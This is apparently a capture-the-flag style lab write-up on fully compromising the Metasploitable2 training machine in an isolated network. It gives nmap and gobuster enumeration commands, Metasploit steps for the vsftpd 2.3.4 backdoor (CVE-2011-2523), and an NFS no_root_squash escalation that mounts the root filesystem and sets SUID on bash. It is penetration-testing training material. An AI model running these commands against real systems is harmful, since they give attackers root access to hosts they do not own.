# Metasploitable2 – Full System Compromise  
## From Service Enumeration to Root via NFS no_root_squash

---

## Overview

- **Target**: Metasploitable2 (Lab Environment)  
- **Attacker**: Kali Linux  
- **Network**: Isolated Host-only Network  
- **Goal**: Full system compromise (root)  
- **Result**: ✅ Root obtained (euid=0)

---

## Attack Flow Summary

Reconnaissance  
→ Service Enumeration (nmap)
→ Initial Shell vsftpd 2.3.4 backdoor --> Root (path1) 
→ Privilege Escalation (NFS no_root_squash) --> Privilege (path2)
→ Root Access

---

## Network Enumeration

Target identified within an isolated lab subnet.

---

## Port & Service Scanning

```bash
nmap -T5 -sV <192.168.18.4>
```
## Exposed Services (Legacy System)
- FTP (vsftpd 2.3.4) 
- Telnet 
- Apache HTTP 
- SMB 
- NFS 
- distccd 
- UnrealIRCd 

The presence of multiple legacy services significantly increases attack surface.

## Web Enumeration
```
gobuster dir -u http://<192.168.18.4> \
-w common.txt -x php,txt,html
```
Finding
phpinfo.php disclosed server paths and configuration details

## Initial Access--Path 1 (vsftpd Backdoor)
Exploit:unix/ftp/vsftpd_234_backdoor
CVE:CVE-2011-2523
Result:Root shell
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <192.168.18.4>
set LHOST <192.168.18.5>
run
getuid # Server username : root
```
![Root Proof](https://1drv.ms/i/c/d38a9571dd9969b9/IQA7YKl5nK_sRI1xUrwhjNzPAXB8J-kGOy9omXO2iZWLuEk?e=hymRdU)

## Privilege Escalation Enumeration--Path2
(NFS Misconfiguration)
Find:NFS export root filesystem with no_root_squash
CVE:N/A(misconfiguration)
Result:Root via SUID bash
```
showmount -e <192.168.18.4>
mount -t nfs <192.168.18.4>:/ /mnt/target
chmod +s /mnt/target/bin/bash
/bin/bash -p
id #euid=0(root0)
```
## Critical Finding
Root filesystem exported via NFS
no_root_squash behavior enabled

## Exploiting NFS Misconfiguration
```
mount -t nfs <192.168.18.4>:/ /mnt/target
chmod +s /mnt/target/bin/bash
```

## Root Access
```
/bin/bash -p
id
```
euid=0(root)

## Impact
Full system compromise
Complete loss of confidentiality, integrity, and availability

## Lessons Learned
Enumeration is more important than exploitation
Legacy services are high-risk
NFS misconfigurations are critical privilege escalation vectors
Knowing when to pivot is a key Pentester skill

## Conclusion
This lab demonstrates how a legacy Linux host can be fully compromised using well-known vulnerabilities and misconfigurations, without the need for zero-day exploits.
Machine Status: Fully Compromised (Rooted)
